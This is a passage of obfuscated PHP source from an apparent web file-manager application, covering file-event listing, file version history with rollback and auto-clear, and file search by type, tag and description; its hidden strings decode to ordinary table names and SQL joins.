$ÔèŸø = array($µ—üî›é[502] => $¡¯ì‹Ã™); if ($˜íªÙÀÈ[$µ—üî›é[496]] == $µ—üî›é[91]) { $¥ÚÙ£®ª = Model($µ—üî›é[1423])->listSearchChildren($¡¯ì‹Ã™, 20000); $¥ÚÙ£®ª[] = $¡¯ì‹Ã™ . $µ—üî›é[465]; $ÔèŸø = array($µ—üî›é[193] => array($µ—üî›é[7], $¥ÚÙ£®ª)); } $İò±Ä¯Ÿ = $this->where($ÔèŸø)->order($µ—üî›é[2223])->selectPage(); if ($İò±Ä¯Ÿ[$µ—üî›é[453]][$µ—üî›é[454]] == 0) { $İò±Ä¯Ÿ[$µ—üî›é[453]][$µ—üî›é[454]] = 1; $İò±Ä¯Ÿ[$µ—üî›é[456]] = array(array($µ—üî›é[502] => $¡¯ì‹Ã™, $µ—üî›é[2203] => $˜íªÙÀÈ[$µ—üî›é[192]], $µ—üî›é[1766] => $˜íªÙÀÈ[$µ—üî›é[538]], $µ—üî›é[507] => $µ—üî›é[2224], $µ—üî›é[508] => $˜íªÙÀÈ[$µ—üî›é[243]], $µ—üî›é[1768] => $µ—üî›é[12])); } return $this->eventListParse($İò±Ä¯Ÿ, $¡¯ì‹Ã™); } private function eventListParse($¥‹€÷óÅ, $¬ïèÜ§©) { $şšúÀ‘— =& $_SERVER[±³—úê]; $àŞŸ”ŸÓ = $¥‹€÷óÅ[$şšúÀ‘—[456]]; $˜¶µÒÆÅ = array_to_keyvalue($àŞŸ”ŸÓ, $şšúÀ‘—[12], $şšúÀ‘—[193]); $òÉÂ•Ò– = array_to_keyvalue($àŞŸ”ŸÓ, $şšúÀ‘—[12], $şšúÀ‘—[2209]); foreach ($àŞŸ”ŸÓ as $›˜ñü¬°) { $äçÖêÆÜ = $›˜ñü¬°[$şšúÀ‘—[537]]; if ($›˜ñü¬°[$şšúÀ‘—[33]] == $şšúÀ‘—[634] && isset($äçÖêÆÜ[$şšúÀ‘—[1243]])) { $˜¶µÒÆÅ[] = $äçÖêÆÜ[$şšúÀ‘—[1243]] . $şšúÀ‘—[12]; $˜¶µÒÆÅ[] = $äçÖêÆÜ[$şšúÀ‘—[1244]] . $şšúÀ‘—[12]; } if ($›˜ñü¬°[$şšúÀ‘—[33]] == $şšúÀ‘—[2220] && isset($äçÖêÆÜ[$şšúÀ‘—[193]])) { $˜¶µÒÆÅ[] = $äçÖêÆÜ[$şšúÀ‘—[193]] . $şšúÀ‘—[12]; } } $˜¶µÒÆÅ = array_merge($˜¶µÒÆÅ, $òÉÂ•Ò–, array($¬ïèÜ§© . $şšúÀ‘—[12])); $˜¶µÒÆÅ = array_unique($˜¶µÒÆÅ); $„¤ä‘§ = array_unique(array_to_keyvalue($àŞŸ”ŸÓ, $şšúÀ‘—[12], $şšúÀ‘—[1775])); $Ì”ÉñÄß = Model($şšúÀ‘—[608])->userListInfo($„¤ä‘§); $©ä¾ß´º = Model($şšúÀ‘—[905])->sourceListInfo($˜¶µÒÆÅ, !0); foreach ($àŞŸ”ŸÓ as &$›˜ñü¬°) { if ($›˜ñü¬°[$şšúÀ‘—[33]] == $şšúÀ‘—[634] && isset($›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[1243]])) { $›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[1243]] = $©ä¾ß´º[$›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[1243]]]; $›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[1244]] = $©ä¾ß´º[$›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[1244]]]; } if ($›˜ñü¬°[$şšúÀ‘—[33]] == $şšúÀ‘—[2220] && isset($›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[193]])) { $›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[193]] = $©ä¾ß´º[$›˜ñü¬°[$şšúÀ‘—[537]][$şšúÀ‘—[193]]]; } $›˜ñü¬°[$şšúÀ‘—[90]] = $©ä¾ß´º[$›˜ñü¬°[$şšúÀ‘—[193]]]; $›˜ñü¬°[$şšúÀ‘—[2225]] = $©ä¾ß´º[$›˜ñü¬°[$şšúÀ‘—[2209]]]; if ($›˜ñü¬°[$şšúÀ‘—[33]] == $şšúÀ‘—[1943]) { $›˜ñü¬°[$şšúÀ‘—[2225]] = $›˜ñü¬°[$şšúÀ‘—[90]]; $›˜ñü¬°[$şšúÀ‘—[2209]] = $›˜ñü¬°[$şšúÀ‘—[2225]][$şšúÀ‘—[193]]; $›˜ñü¬°[$şšúÀ‘—[90]] = !1; $›˜ñü¬°[$şšúÀ‘—[193]] = $şšúÀ‘—[12]; } $›˜ñü¬°[$şšúÀ‘—[2152]] = $Ì”ÉñÄß[$›˜ñü¬°[$şšúÀ‘—[1775]]]; } unset($›˜ñü¬°); $¥‹€÷óÅ[$şšúÀ‘—[456]] = $àŞŸ”ŸÓ; return $¥‹€÷óÅ; } public function removeBySource($ÛÊ½åÙ‡) { $µÁ¼¢Ä = array($_SERVER[±³—úê][502] => $ÛÊ½åÙ‡); $this->where($µÁ¼¢Ä)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\143\145\137\x68\151\163\x74\157\162\171"; public function historyCount($²–ØşéÙ) { $ÜàÃ¤ç =& $_SERVER[±³—úê]; if (!$²–ØşéÙ) { return array(); } if (is_string($²–ØşéÙ) || is_int($²–ØşéÙ)) { $²–ØşéÙ = array($²–ØşéÙ); } $Ú¾²ÄÚ = array($ÜàÃ¤ç[193], $ÜàÃ¤ç[2226] => $ÜàÃ¤ç[576]); $°—­Õã = array($ÜàÃ¤ç[193] => array($ÜàÃ¤ç[7], $²–ØşéÙ)); $¼áãáÂˆ = $this->field($Ú¾²ÄÚ)->where($°—­Õã)->group($ÜàÃ¤ç[193])->select(); return array_to_keyvalue($¼áãáÂˆ, $ÜàÃ¤ç[193], $ÜàÃ¤ç[576]); } public function addHistory($Àä¤Ë¨, $³ûµÃÔ = '') { $»Öó­¢Ş =& $_SERVER[±³—úê]; $“å–´Ôî = array($»Öó­¢Ş[502] => $Àä¤Ë¨[$»Öó­¢Ş[193]], $»Öó­¢Ş[1766] => isset($Àä¤Ë¨[$»Öó­¢Ş[540]]) ? $Àä¤Ë¨[$»Öó­¢Ş[540]] : $Àä¤Ë¨[$»Öó­¢Ş[538]], $»Öó­¢Ş[553] => $Àä¤Ë¨[$»Öó­¢Ş[552]], $»Öó­¢Ş[631] => $Àä¤Ë¨[$»Öó­¢Ş[79]], $»Öó­¢Ş[2227] => $³ûµÃÔ); if ($GLOBALS[$»Öó­¢Ş[6]][$»Öó­¢Ş[92]][$»Öó­¢Ş[1304]] >= 1) { $this->historyAutoClear($“å–´Ôî[$»Öó­¢Ş[193]]); $this->add($“å–´Ôî); } Hook::trigger($»Öó­¢Ş[2228], $“å–´Ôî); Model($»Öó­¢Ş[2229])->eventFileEdit($Àä¤Ë¨[$»Öó­¢Ş[193]]); } private function historyAutoClear($í¢¦·ÆÙ) { $ÊäŸ±Ë =& $_SERVER[±³—úê]; $Úİ÷³õÛ = Model($ÊäŸ±Ë[850])->get($ÊäŸ±Ë[1326]); $Ÿˆ ˜ÅÁ = intval($GLOBALS[$ÊäŸ±Ë[6]][$ÊäŸ±Ë[92]][$ÊäŸ±Ë[1304]]); $ƒ‰©¹ªç = $Úİ÷³õÛ == $ÊäŸ±Ë[1327] ? min(5, $Ÿˆ ˜ÅÁ) : $Ÿˆ ˜ÅÁ; $ƒ‰©¹ªç = $ƒ‰©¹ªç <= 0 ? 0 : $ƒ‰©¹ªç - 1; if ($ƒ‰©¹ªç >= 499) { return; } $éÏ¨âã“ = array($ÊäŸ±Ë[502] => $í¢¦·ÆÙ); $Â—Æñùé = $this->field($ÊäŸ±Ë[2230])->where($éÏ¨âã“)->order($ÊäŸ±Ë[2223])->select(); if (!$Â—Æñùé || $ƒ‰©¹ªç >= count($Â—Æñùé)) { return; } $òìõâÁ… = array_to_keyvalue($Â—Æñùé, $ÊäŸ±Ë[12], $ÊäŸ±Ë[486]); $òìõâÁ… = array_slice($òìõâÁ…, $ƒ‰©¹ªç); $‘ß×âéÖ = array_to_keyvalue($Â—Æñùé, $ÊäŸ±Ë[12], $ÊäŸ±Ë[552]); $‘ß×âéÖ = array_slice($‘ß×âéÖ, $ƒ‰©¹ªç); if (!$òìõâÁ… || !$‘ß×âéÖ) { return; } $éÏ¨âã“ = array($ÊäŸ±Ë[504] => array($ÊäŸ±Ë[7], $òìõâÁ…)); $this->where($éÏ¨âã“)->delete(); Model($ÊäŸ±Ë[555])->remove($‘ß×âéÖ); } public function listData($˜÷Á“ı‡) { $ÕŠ™İ€¦ =& $_SERVER[±³—úê]; $„ÜÔëİ¤ = array($ÕŠ™İ€¦[502] => $˜÷Á“ı‡); $ø·çÊşÓ = $ÕŠ™İ€¦[2231]; $ûƒÚ‘‹— = $this->field($ø·çÊşÓ)->where($„ÜÔëİ¤)->order($ÕŠ™İ€¦[2223])->selectPage(); $this->_listAppendUser($ûƒÚ‘‹—[$ÕŠ™İ€¦[456]]); $· ÍŠ×Õ = Model($ÕŠ™İ€¦[850])->get($ÕŠ™İ€¦[1326]); $³ùÄ¥Õ… = 5; if ($· ÍŠ×Õ == $ÕŠ™İ€¦[1327]) { $ûƒÚ‘‹—[$ÕŠ™İ€¦[456]] = array_slice($ûƒÚ‘‹—[$ÕŠ™İ€¦[456]], 0, $³ùÄ¥Õ…); $ûƒÚ‘‹—[$ÕŠ™İ€¦[453]] = array($ÕŠ™İ€¦[2232] => 1, $ÕŠ™İ€¦[2233] => 20, $ÕŠ™İ€¦[2234] => 1, $ÕŠ™İ€¦[2235] => count($ûƒÚ‘‹—[$ÕŠ™İ€¦[456]])); } return $ûƒÚ‘‹—; } protected function _listAppendUser(&$õ¨óì‰×) { $Ä†òÕÅÇ =& $_SERVER[±³—úê]; $İÓş› = array_to_keyvalue($õ¨óì‰×, $Ä†òÕÅÇ[12], $Ä†òÕÅÇ[1775]); $ü¼²• ‚ = Model($Ä†òÕÅÇ[608])->userListInfo($İÓş›); foreach ($õ¨óì‰× as &$¶…İ–„) { $‰üúš›— = $¶…İ–„[$Ä†òÕÅÇ[1775]]; $¶…İ–„[$Ä†òÕÅÇ[538]] = $ü¼²• ‚[$‰üúš›—] ? $ü¼²• ‚[$‰üúš›—] : !1; } unset($¶…İ–„); } public function fileInfo($Ï¦Ç¶ˆ‹) { $ä‹Æ¾›õ =& $_SERVER[±³—úê]; $ë¯ªÊ®¢ = $this->tablePrefix; $°ôëìŠ = "{$ë¯ªÊ®¢}\151\157\x5f\146\151\x6c\145\x20\x66\x69\154\x65\163\40\157\x6e\40\x66\151\x6c\145\163\56\146\151\x6c\x65\x49\104\x20\x3d\x20\150\x69\x73\164\x6f\x72\x79\56\x66\x69\x6c\x65\111\x44"; return $this->alias($ä‹Æ¾›õ[2236])->where(array($ä‹Æ¾›õ[504] => $Ï¦Ç¶ˆ‹))->join($°ôëìŠ, $ä‹Æ¾›õ[2237])->find(); } public function removeItem($±Í­üûí) { $ºì¤“« =& $_SERVER[±³—úê]; $Ë¸¶¤ø² = array($ºì¤“«[504] => $±Í­üûí); $–¦ÑĞË— = $this->where($Ë¸¶¤ø²)->find(); if ($–¦ÑĞË—) { $¥ÏÁ¯÷‰ = $this->where($Ë¸¶¤ø²)->delete(); Model($ºì¤“«[555])->remove($–¦ÑĞË—[$ºì¤“«[552]]); return $¥ÏÁ¯÷‰; } return !1; } public function removeBySource($šŠßÙÓ°) { $¨…¿ØŸİ =& $_SERVER[±³—úê]; if (!$šŠßÙÓ°) { return !1; } if (!is_array($šŠßÙÓ°)) { $šŠßÙÓ° = array($šŠßÙÓ°); } $Ãı®Œ“  = array($¨…¿ØŸİ[502] => array($¨…¿ØŸİ[7], $šŠßÙÓ°)); $’î‚Ñâ€ = $this->field($¨…¿ØŸİ[553])->where($Ãı®Œ“ )->select(); if ($’î‚Ñâ€) { $this->where($Ãı®Œ“ )->delete(); $â÷Ã‚¦Š = array_to_keyvalue($’î‚Ñâ€, $¨…¿ØŸİ[12], $¨…¿ØŸİ[552]); Model($¨…¿ØŸİ[555])->remove($â÷Ã‚¦Š); } return !0; } public function setDetail($àóé‚ìÖ, $†À›º¤–) { $¢®Üöªı =& $_SERVER[±³—úê]; return $this->where(array($¢®Üöªı[504] => $àóé‚ìÖ))->save(array($¢®Üöªı[2227] => $†À›º¤–)); } public function rollbackToItem($èúÙå˜œ, $×ö£ÚÏ¿) { $àãÈ“¢Ï =& $_SERVER[±³—úê]; $¶¦ä¸úœ = Model($àãÈ“¢Ï[905])->sourceInfo($èúÙå˜œ); $this->addHistory($¶¦ä¸úœ, LNG($àãÈ“¢Ï[2238])); $Õğ·ç = $this->find($×ö£ÚÏ¿); $ª®÷˜¯ç = array($àãÈ“¢Ï[552] => $Õğ·ç[$àãÈ“¢Ï[552]], $àãÈ“¢Ï[79] => $Õğ·ç[$àãÈ“¢Ï[79]], $àãÈ“¢Ï[88] => time(), $àãÈ“¢Ï[540] => USER_ID); Model($àãÈ“¢Ï[905])->where(array($àãÈ“¢Ï[193] => $èúÙå˜œ))->save($ª®÷˜¯ç); return $this->where(array($àãÈ“¢Ï[504] => $×ö£ÚÏ¿))->delete(); } public function clearSame($Í‡œÉï¼) { $Óµû»Ö =& $_SERVER[±³—úê]; $ÃËÖ‰ƒù = $this->listData($Í‡œÉï¼); $§³á¥Ô‡ = array_to_keyvalue_group($ÃËÖ‰ƒù, $Óµû»Ö[552]); $”‘²‘Íµ = array(); $º·Àô…¬ = array(); foreach ($§³á¥Ô‡ as $îéÕ£Õ¬) { if (!$îéÕ£Õ¬ || count($îéÕ£Õ¬) <= 1) { continue; } foreach ($îéÕ£Õ¬ as $Š³é‘µ“) { $”‘²‘Íµ[] = $Š³é‘µ“[$Óµû»Ö[552]]; $º·Àô…¬[] = $Š³é‘µ“[$Óµû»Ö[486]]; } } if (!$º·Àô…¬) { return; } $this->where(array($Óµû»Ö[486] => array($Óµû»Ö[7], $º·Àô…¬)))->delete(); Model($Óµû»Ö[555])->remove($”‘²‘Íµ); } public function userSpace() { $‡ƒÆ·ó =& $_SERVER[±³—úê]; $² ¼ŠÛĞ = $this->tablePrefix; $º×ıİÅ© = array($‡ƒÆ·ó[1766] => USER_ID); $’µŠã‡€ = "{$² ¼ŠÛĞ}\x69\157\137\x66\x69\x6c\145\x20\146\151\154\x65\163\40\x6f\x6e\x20\x66\151\154\x65\x73\56\146\151\154\x65\x49\x44\x20\x3d\40\x68\151\163\x74\x6f\x72\171\56\146\151\154\145\111\x44"; return $this->alias($‡ƒÆ·ó[2236])->where($º×ıİÅ©)->join($’µŠã‡€, $‡ƒÆ·ó[2237])->sum($‡ƒÆ·ó[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($’®Ó¥»“) { $†ªãˆ” =& $_SERVER[±³—úê]; $â ±æ–¨ = KodIO::fileTypeList(); $£›‹ìß¸ = $â ±æ–¨[$’®Ó¥»“]; if (!$£›‹ìß¸) { return array(); } $ì½ˆÆ²· = $£›‹ìß¸[$†ªãˆ”[169]]; $Åì†¼’Ó = $†ªãˆ”[7]; if (!$£›‹ìß¸[$†ªãˆ”[169]]) { $¢­¦Âí = array_to_keyvalue($â ±æ–¨, $†ªãˆ”[12], $†ªãˆ”[169]); $ì½ˆÆ²· = implode($†ªãˆ”[50], $¢­¦Âí); $Åì†¼’Ó = $†ªãˆ”[2239]; } $âÂ¨ô¬¹ = explode($†ªãˆ”[50], trim($ì½ˆÆ²·, $†ªãˆ”[50])); return array($Åì†¼’Ó, $âÂ¨ô¬¹); } public function listPathType($ï¤¤×ïÃ) { $¦ ôàï =& $_SERVER[±³—úê]; $°¯ù»­ì = $this->fileTypeWhere($ï¤¤×ïÃ); if (!$°¯ù»­ì) { return array(); } $ŞÓ‰’˜Ş = USER_ID; $ÚìÙÓ±è = Model($¦ ôàï[608])->getInfo($ŞÓ‰’˜Ş); $¦Üüšë’ = array($¦ ôàï[662] => SourceModel::TYPE_USER, $¦ ôàï[595] => array($¦ ôàï[626], $¦ ôàï[604] . $ÚìÙÓ±è[$¦ ôàï[90]][$¦ ôàï[193]] . $¦ ôàï[627]), $¦ ôàï[663] => $ŞÓ‰’˜Ş, $¦ ôàï[660] => 0, $¦ ôàï[661] => $°¯ù»­ì); return $this->listSource($¦Üüšë’); } public function listSearch($ËÍ¸Æ·ß, $—¸„ËşĞ = 300) { $ùÅ ±¹ =& $_SERVER[±³—úê]; if (isset($ËÍ¸Æ·ß[$ùÅ ±¹[2073]]) && $ËÍ¸Æ·ß[$ùÅ ±¹[2073]]) { $ËÍ¸Æ·ß[$ùÅ ±¹[2073]] = str_replace($ùÅ ±¹[471], $ùÅ ±¹[2240], trim($ËÍ¸Æ·ß[$ùÅ ±¹[2073]])); } $ë³›—…ğ = $this->_parseSearchWhere($ËÍ¸Æ·ß); if (!isset($ë³›—…ğ[$ùÅ ±¹[516]])) { $ë³›—…ğ[$ùÅ ±¹[516]] = 0; } $ÜŸàÉêİ = $ùÅ ±¹[2241]; $â°¡£ = $ë³›—…ğ; $Î”‹µ = $ÜŸàÉêİ; $this->_listSearchBindPinyin($ËÍ¸Æ·ß, $ë³›—…ğ, $ÜŸàÉêİ); $this->alias($ùÅ ±¹[530])->_makeOrder(); $ë³›—…ğ = $this->parseWhereLike($ë³›—…ğ); $›ñ­› = $this->distinct(!0)->field($ÜŸàÉêİ)->where($ë³›—…ğ)->selectPage($—¸„ËşĞ); if ($GLOBALS[$ùÅ ±¹[6]][$ùÅ ±¹[468]][$ùÅ ±¹[469]] && Input::check($ËÍ¸Æ·ß[$ùÅ ±¹[2073]], $ùÅ ±¹[669]) && $›ñ­›[$ùÅ ±¹[453]][$ùÅ ±¹[439]] == 1 && $›ñ­›[$ùÅ ±¹[453]][$ùÅ ±¹[454]] == 0) { $›ñ­› = $this->distinct(!0)->field($ÜŸàÉêİ)->where($â°¡£)->limit(1000)->select(); $›ñ­› = array_page_split($›ñ­›, !1, $—¸„ËşĞ); } $this->_listSearchFileContent($›ñ­›, $ËÍ¸Æ·ß, $Î”‹µ, $â°¡£); $this->_listSearchDesc($›ñ­›, $ËÍ¸Æ·ß, $Î”‹µ); $this->_listSearchTag($›ñ­›, $ËÍ¸Æ·ß, $Î”‹µ); $this->_listSearchGroupTag($›ñ­›, $ËÍ¸Æ·ß, $Î”‹µ); $this->_listDataApply($›ñ­›[$ùÅ ±¹[456]]); $this->_listMake($›ñ­›); return $›ñ­›; } private function _listSearchFileContent(&$Àğéü¬Á, $“ˆóÆ¬´, $Ï¤Šü•Ñ, $ˆ÷Ú±Öß) { $ôÑ²İï =& $_SERVER[±³—úê]; if (!$“ˆóÆ¬´[$ôÑ²İï[2073]] || $Àğéü¬Á[$ôÑ²İï[453]][$ôÑ²İï[439]] > 1) { return; } if (!isset($ˆ÷Ú±Öß[$ôÑ²İï[32]]) || !is_array($“ˆóÆ¬´[$ôÑ²İï[552]])) { return; } $ˆ÷Ú±Öß[$ôÑ²İï[552]] = array($ôÑ²İï[7], $“ˆóÆ¬´[$ôÑ²İï[552]]); unset($ˆ÷Ú±Öß[$ôÑ²İï[32]]); unset($“ˆóÆ¬´[$ôÑ²İï[552]]); $×Ğø²× = $this->field($Ï¤Šü•Ñ)->where($ˆ÷Ú±Öß)->limit($ôÑ²İï[2242])->select(); if (!$×Ğø²× || count($×Ğø²×) == 0) { return; } $Àğéü¬Á[$ôÑ²İï[456]] = array_merge($×Ğø²×, $Àğéü¬Á[$ôÑ²İï[456]]); $Àğéü¬Á[$ôÑ²İï[453]][$ôÑ²İï[454]] += count($×Ğø²×); } private function _listSearchTag(&$â«ŠµŸË, $Ô™Öü¨÷, $÷øı’ÅØ) { $˜Ë¤ş” =& $_SERVER[±³—úê]; if (!$Ô™Öü¨÷[$˜Ë¤ş”[2073]] || $â«ŠµŸË[$˜Ë¤ş”[453]][$˜Ë¤ş”[439]] > 1) { return; } $ÎªîŠ¼ô = Model($˜Ë¤ş”[2243])->listData(); $ü»Ò¬øİ = array(); $’äÙ»Óò = $Ô™Öü¨÷[$˜Ë¤ş”[2073]]; foreach ($ÎªîŠ¼ô as $Óñø¸­—) { $ØÃı×ûğ = $Óñø¸­—[$˜Ë¤ş”[32]]; $É½«»² = str_replace($˜Ë¤ş”[53], $˜Ë¤ş”[12], Pinyin::get($ØÃı×ûğ)); if (stripos($ØÃı×ûğ, $’äÙ»Óò) !== !1 || stripos($É½«»², $’äÙ»Óò) !== !1) { $ü»Ò¬øİ[] = $Óñø¸­—[$˜Ë¤ş”[486]]; } } if (!$ü»Ò¬øİ) { return; } $Úñ½ÃŸ = array($˜Ë¤ş”[511] => array($˜Ë¤ş”[7], $ü»Ò¬øİ), $˜Ë¤ş”[1775] => USER_ID); $·ªÖèÔ¨ = Model($˜Ë¤ş”[513])->field($˜Ë¤ş”[87])->where($Úñ½ÃŸ)->select(); $·ªÖèÔ¨ = array_to_keyvalue($·ªÖèÔ¨, $˜Ë¤ş”[12], $˜Ë¤ş”[87]); $„Æ¡¿Ë¤ = array_unique($·ªÖèÔ¨); $this->_listSearchMerge($â«ŠµŸË, $Ô™Öü¨÷, $÷øı’ÅØ, $„Æ¡¿Ë¤); } private function _listSearchDesc(&$åıŸëŸö, $ôŠ·çŠ”, $š–‹ßĞ) { $õô’ÇÇ‚ =& $_SERVER[±³—úê]; if (!$ôŠ·çŠ”[$õô’ÇÇ‚[2073]] || $åıŸëŸö[$õô’ÇÇ‚[453]][$õô’ÇÇ‚[439]] > 1) { return; } $Ç¼•ôªš = array($õô’ÇÇ‚[97] => $õô’ÇÇ‚[537], $õô’ÇÇ‚[461] => array($õô’ÇÇ‚[470], $õô’ÇÇ‚[2075] . $ôŠ·çŠ”[$õô’ÇÇ‚[2073]] . $õô’ÇÇ‚[2075])); $Ÿí˜Ë¢¹ = !1; if ($Ÿí˜Ë¢¹) { $¯™ÒÏµØ = $this->listSearchChildren($ôŠ·çŠ”[$õô’ÇÇ‚[192]]); $¯™ÒÏµØ = array_unique($¯™ÒÏµØ); if (!$¯™ÒÏµØ) { return; } $Ç¼•ôªš[$õô’ÇÇ‚[193]] = array($õô’ÇÇ‚[7], $¯™ÒÏµØ); } $çµ™ŸË¿ = Model($õô’ÇÇ‚[646])->field($õô’ÇÇ‚[193])->where($Ç¼•ôªš)->limit(5000)->select(); $¿«­æÍ¹ = array_to_keyvalue($çµ™ŸË¿, $õô’ÇÇ‚[12], $õô’ÇÇ‚[193]); $this->_listSearchMerge($åıŸëŸö, $ôŠ·çŠ”, $š–‹ßĞ, $¿«­æÍ¹); } private function _listSearchGroupTag(&$Ú×Ü’õ¡, $ÉŞìê, $Ô’ÎÚ») { $Ü†¼‚áá =& $_SERVER[±³—úê]; if (!$ÉŞìê[$Ü†¼‚áá[2073]] || $Ú×Ü’õ¡[$Ü†¼‚áá[453]][$Ü†¼‚áá[439]] > 1 || !$ÉŞìê[$Ü†¼‚áá[192]]) { return; } $×¹©ŠÊ = $this->sourceInfo($ÉŞìê[$Ü†¼‚áá[192]]); if (!$×¹©ŠÊ || $×¹©ŠÊ[$Ü†¼‚áá[190]] != SourceModel::TYPE_GROUP) { return; } $ûìï‘ÃÒ = $×¹©ŠÊ[$Ü†¼‚áá[580]]; $ÎÉ˜ıÓŒ = Model($Ü†¼‚áá[2244])->get($ûìï‘ÃÒ); $¾å’óö“ = array(); $ÑÉ¿Ş¸ = $ÉŞìê[$Ü†¼‚áá[2073]]; foreach ($ÎÉ˜ıÓŒ[$Ü†¼‚áá[456]] as $İ¼‰Ü¤) { $İò”êõÅ = $İ¼‰Ü¤[$Ü†¼‚áá[32]]; $÷»µçƒğ = str_replace($Ü†¼‚áá[53], $Ü†¼‚áá[12], Pinyin::get($İò”êõÅ)); if (stripos($İò”êõÅ, $ÑÉ¿Ş¸) !== !1 || stripos($÷»µçƒğ, $ÑÉ¿Ş¸) !== !1) { $¾å’óö“[] = $İ¼‰Ü¤[$Ü†¼‚áá[486]]; } } if (!$¾å’óö“) { return; } $ºùÏ¥ Ğ = array($Ü†¼‚áá[511] => array($Ü†¼‚áá[7], $¾å’óö“), $Ü†¼‚áá[1775] => 0, $Ü†¼‚áá[33] => $Ü†¼‚áá[2095] . $ûìï‘ÃÒ); $Ç‰¥ú¡É = Model($Ü†¼‚áá[513])->field($Ü†¼‚áá[87])->where($ºùÏ¥ Ğ)->select(); $Ç‰¥ú¡É = array_to_keyvalue($Ç‰¥ú¡É, $Ü†¼‚áá[12], $Ü†¼‚áá[87]); $ëêñ½¨¨ = array_unique($Ç‰¥ú¡É); $this->_listSearchMerge($Ú×Ü’õ¡, $ÉŞìê, $Ô’ÎÚ», $ëêñ½¨¨); } private function _listSearchMerge(&$ê€, $§åÎâò½, $Üª‰û£±, $ï†ÛÏÂ) { $ÑÎ¯Üë‡ =& $_SERVER[±³—úê]; if (!$ï†ÛÏÂ) { return; } $Îƒ›ªŸ¶ = array_to_keyvalue($ê€[$ÑÎ¯Üë‡[456]], $ÑÎ¯Üë‡[12], $ÑÎ¯Üë‡[193]); $ş¥¯“óâ = array_diff($ï†ÛÏÂ, $Îƒ›ªŸ¶); if (!$ş¥¯“óâ) { return; } $ØåËÜË‡ = array($ÑÎ¯Üë‡[193] => array($ÑÎ¯Üë‡[7], $ş¥¯“óâ)); $Îé®¿Ÿ = $this->field($Üª‰û£±)->where($ØåËÜË‡)->select(); if (!$Îé®¿Ÿ) { return; } $µçí€äí = array(); foreach ($Îé®¿Ÿ as $Ô­ÖŠ¿) { if ($this->_listSearchFilter($Ô­ÖŠ¿, $§åÎâò½)) { $µçí€äí[] = $Ô­ÖŠ¿; } } $ê€[$ÑÎ¯Üë‡[456]] = array_merge($µçí€äí, $ê€[$ÑÎ¯Üë‡[456]]); $ê€[$ÑÎ¯Üë‡[453]][$ÑÎ¯Üë‡[454]] += count($µçí€äí); } private function _listSearchFilter($ôÑ‘÷£, $”èîµØŞ) { $€îÒ­ú› =& $_SERVER[±³—úê]; $Ëôñè¡ = $ôÑ‘÷£[$€îÒ­ú›[496]] == $€îÒ­ú›[91]; if (!strstr($ôÑ‘÷£[$€îÒ­ú›[595]], $€îÒ­ú›[50] . $”èîµØŞ[$€îÒ­ú›[192]] . $€îÒ­ú›[50])) { return !1; } if (isset($”èîµØŞ[$€îÒ­ú›[497]]) && $”èîµØŞ[$€îÒ­ú›[497]] != $€îÒ­ú›[856]) { if ($”èîµØŞ[$€îÒ­ú›[497]] == $€îÒ­ú›[78] && !$Ëôñè¡) { return !1; } if ($”èîµØŞ[$€îÒ­ú›[497]] != $€îÒ­ú›[78] && $Ëôñè¡) { return !1; } if (!strstr($ôÑ‘÷£[$€îÒ­ú›[169]], $€îÒ­ú›[50] . $”èîµØŞ[$€îÒ­ú›[497]] . $€îÒ­ú›[50])) { return !1; } } if (isset($”èîµØŞ[$€îÒ­ú›[2245]]) && $”èîµØŞ[$€îÒ­ú›[2245]] < $ôÑ‘÷£[$€îÒ­ú›[79]]) { return !1; } if (isset($”èîµØŞ[$€îÒ­ú›[2246]]) && $”èîµØŞ[$€îÒ­ú›[2246]] > $ôÑ‘÷£[$€îÒ­ú›[79]]) { return !1; } if (isset($”èîµØŞ[$€îÒ­ú›[676]]) && $”èîµØŞ[$€îÒ­ú›[676]] != $ôÑ‘÷£[$€îÒ­ú›[540]]) { return !1; } return !0; } public function listSearchChildren($øí¤«Ñî, $¹’Ê—ÈŠ = 5000) { $˜ˆË«ËÊ =& $_SERVER[±³—úê]; $¾åŞ²Õ = array(); $©Õ„À = $this->sourceInfo($øí¤«Ñî); $ß†• Ñƒ = array($˜ˆË«ËÊ[595] => array($˜ˆË«ËÊ[470], $©Õ„À[$˜ˆË«ËÊ[595]] . $©Õ„À[$˜ˆË«ËÊ[193]] . $˜ˆË«ËÊ[627])); $“›ªÍï­ = $this->field($˜ˆË«ËÊ[79])->where($ß†• Ñƒ)->limit($¹’Ê—ÈŠ + 1)->select(); $ö½³ÌÀÇ = is_array($“›ªÍï­) ? count($“›ªÍï­) : 0; if ($ö½³ÌÀÇ > $¹’Ê—ÈŠ) { return $this->_listSearchChildrenNear($øí¤«Ñî, $¹’Ê—ÈŠ); } $©æÌìÚ– = $this->field($˜ˆË«ËÊ[193])->where($ß†• Ñƒ)->select(); $¾åŞ²Õ = array_to_keyvalue($©æÌìÚ–, $˜ˆË«ËÊ[12], $˜ˆË«ËÊ[193]); return $¾åŞ²Õ; } private function _listSearchChildrenNear($½ÅÔœ…õ, $İÚ»½…º) { $øœèÂáî =& $_SERVER[±³—úê]; $ñÍ¢ñÊÉ = array(); $òÈ„Â– = array($øœèÂáî[192] => $½ÅÔœ…õ); $º‹ªÖä® = $this->field($øœèÂáî[2247])->where($òÈ„Â–)->select(); $‡ú••‰¬ = array_to_keyvalue(array_filter_by_field($º‹ªÖä®, $øœèÂáî[496], $øœèÂáî[91]), $øœèÂáî[12], $øœèÂáî[193]); $ñÍ¢ñÊÉ = array_merge($ñÍ¢ñÊÉ, array_to_keyvalue($º‹ªÖä®, $øœèÂáî[12], $øœèÂáî[193])); if (!$‡ú••‰¬) { return $ñÍ¢ñÊÉ; } $òÈ„Â– = array($øœèÂáî[192] => array($øœèÂáî[7], $‡ú••‰¬)); $º‹ªÖä® = $this->field($øœèÂáî[2247])->where($òÈ„Â–)->limit($İÚ»½…º)->select(); $ñÍ¢ñÊÉ = array_merge($ñÍ¢ñÊÉ, array_to_keyvalue($º‹ªÖä®, $øœèÂáî[12], $øœèÂáî[193])); $ñÍ¢ñÊÉ = array_slice($ñÍ¢ñÊÉ, 